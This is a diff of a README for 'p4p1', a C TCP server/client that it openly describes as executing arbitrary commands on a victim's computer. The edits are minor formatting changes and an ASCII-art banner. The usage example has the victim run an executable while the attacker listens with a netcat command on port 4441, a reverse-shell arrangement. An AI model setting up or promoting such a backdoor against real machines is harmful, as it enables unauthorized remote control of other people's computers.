@@ -1,5 +1,5 @@
 # p4p1
-C open Source TCP server/client to execute arbitury commands on victim computer. They are all in developpement state. 
+C open Source TCP server/client to execute arbitury commands on victim computer. They are all in developpement state.
 For now the only stable versions are:
 
 ##Windows
@@ -21,10 +21,15 @@ with the listening port, and connect to it with the client in the same app.
 #Exemple:
 
 ##Victim:
-Execute p4p1-o_xx.exe
+Execute p4p1-o_Vx.exe
 
 ##Attacker:
-nc -l 4441 <br />
-*listening <br />
-\<p4p1 /\>
+nc -l 4441
+0
+       _ _       _
+  _ __| | | _ __/ |
+ | '_ \_  _| '_ \ |
+ | .__/ |_|| .__/_|
+ |_|       |_|
 
+<p4p1 />
